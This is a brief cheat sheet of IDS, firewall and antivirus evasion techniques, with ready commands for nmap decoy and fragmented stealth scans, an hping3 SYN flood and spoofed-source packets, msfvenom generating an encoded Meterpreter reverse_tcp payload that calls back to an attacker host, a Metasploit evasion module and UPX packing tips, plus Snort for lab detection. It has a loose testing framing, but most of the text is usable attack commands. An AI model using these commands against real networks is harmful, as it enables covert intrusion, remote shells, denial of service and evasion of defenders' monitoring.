1. Nmap (with IDS Evasion Options)
Purpose: Scan networks while avoiding detection by IDS/firewalls.

	Useful Options:

	nmap -sS -T2 -D RND:10 -f -oN stealth_scan.txt target_ip

Flag breakdown:
•
-sS: Stealth SYN scan
•
-T2: Slow scan timing (evade rate-based alerts)
•
-D RND:10: Use 10 random decoys
•
-f: Fragment packets (makes detection harder)
•
--data-length: Pads packets with junk data
Best for: Testing firewall and IDS rules.



2. Hping3 (Custom Packets for Firewall Bypass)
Purpose: Send crafted packets to probe/firewall-bypass specific ports.

Example: Send TCP packet with SYN flag
hping3 -S -p 80 --flood target_ip

	To spoof IP:

	hping3 -S -p 22 -a 1.2.3.4 target_ip

Use Case: Check which packets pass through stateless firewalls or simulate port scans.



3. Metasploit Evasion Techniques
Purpose: Evade antivirus/IDS when delivering payloads.

	Use encoders (e.g., shikata_ga_nai):

	msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -e x86/shikata_ga_nai -f exe > payload.exe


	Evasion Module:

	use evasion/windows/meterpreter/bindshell_hidden

Tip: Combine with packing tools (UPX) or obfuscators.



4. Snort (for Lab Testing/Detection)
Purpose: Open-source IDS – simulate and test your evasion techniques.

	Run in packet capture mode:

	snort -A console -i eth0 -c /etc/snort/snort.conf

Good for:
•
Signature rule writing
•
Observing evasion attempt detection